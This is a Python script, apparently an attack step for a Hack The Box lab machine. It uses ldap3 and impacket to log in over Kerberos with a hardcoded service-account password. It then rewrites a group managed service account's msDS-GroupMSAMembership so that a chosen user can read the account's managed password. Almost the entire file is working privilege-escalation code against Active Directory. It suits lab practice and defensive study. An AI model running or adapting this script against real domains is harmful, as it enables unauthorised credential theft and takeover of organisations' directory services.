#!/usr/bin/env python3
import ldap3
from impacket.ldap import ldaptypes
import os

TARGET_IP = "10.129.24.21"
DOMAIN = "logging.htb"
USER = "svc_recovery@LOGGING.HTB"  # Kerberos format

# Correct SID for wallace.everette
WALLACE_SID = 'S-1-5-21-4020823815-2796529489-1682170552-2111'

# Use Kerberos authentication (requires valid ticket)
# First, get a ticket:
print("[*] Make sure you have a valid Kerberos ticket:")
print(f"    export KRB5CCNAME=$(pwd)/svc_recovery.ccache")
print("    faketime -f '+7h' impacket-getTGT 'logging.htb/svc_recovery:Em3rg3ncyPa$$2026' -dc-ip 10.129.24.21")
input("Press Enter after obtaining ticket...")

# Connect using Kerberos
server = ldap3.Server(TARGET_IP, get_info=ldap3.ALL)
conn = ldap3.Connection(
    server,
    user=f"{USER}",
    authentication=ldap3.SASL,
    sasl_mechanism=ldap3.KERBEROS,
    auto_bind=True
)

print(f"[+] Connected as: {conn.extend.standard.who_am_i()}")

# Build Security Descriptor
sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
sd['Revision'] = b'\x01'
sd['Sbz1'] = b'\x00'
sd['Control'] = 32772
sd['OwnerSid'] = ldaptypes.LDAP_SID()
sd['OwnerSid'].fromCanonical('S-1-5-18')
sd['GroupSid'] = b''
sd['Sacl'] = b''

# Create ACL with ACE
acl = ldaptypes.ACL()
acl['AclRevision'] = 4
acl['Sbz1'] = 0
acl['Sbz2'] = 0

# Create ACCESS_ALLOWED_ACE
ace = ldaptypes.ACE()
ace['AceType'] = 0
ace['AceFlags'] = 0
nace = ldaptypes.ACCESS_ALLOWED_ACE()
nace['Mask'] = ldaptypes.ACCESS_MASK()
nace['Mask']['Mask'] = 983551  # Full control
nace['Sid'] = ldaptypes.LDAP_SID()
nace['Sid'].fromCanonical(WALLACE_SID)
ace['Ace'] = nace

acl.aces = [ace]
sd['Dacl'] = acl

# Modify the gMSA object
target_dn = 'CN=msa_health,CN=Managed Service Accounts,DC=logging,DC=htb'
conn.modify(
    target_dn,
    {'msDS-GroupMSAMembership': [(ldap3.MODIFY_REPLACE, [sd.getData()])]}
)

print(f"[+] Modify result: {conn.result}")
print(f"[+] Granted {WALLACE_SID} read access to msa_health$ password")

conn.unbind()